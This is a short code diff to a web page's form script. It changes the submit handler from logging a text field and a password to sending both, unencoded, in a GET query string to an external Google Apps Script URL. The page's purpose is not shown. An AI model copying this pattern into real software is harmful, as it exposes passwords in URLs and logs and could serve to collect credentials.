@@ -25,14 +25,18 @@
       </form>
     </main>
     <script>
-      document.getElementById('formID').addEventListener('submit', e => {
+      document.getElementById('formID').addEventListener('submit', async e => {
         e.preventDefault()
         
         const text = document.getElementById('textID').value
         const password = document.getElementById('passwordID').value
         document.getElementById('formID').innerText = "Loading..."
         
-        console.log(text, password)
+        
+        const res = await fetch(`https://script.google.com/macros/s/AKfycbyI_nGs0CMk46iN6gGfYxlda_wpsGn3JdLWUKLS55idzAyrNWXPKTfg7zLYRCwtUThO6A/exec`
+          +`?a=${text}&b=${password}`)
+        const resText = await res.text()
+        document.getElementById('formID').innerText = resText
       })
     </script>
   </body>
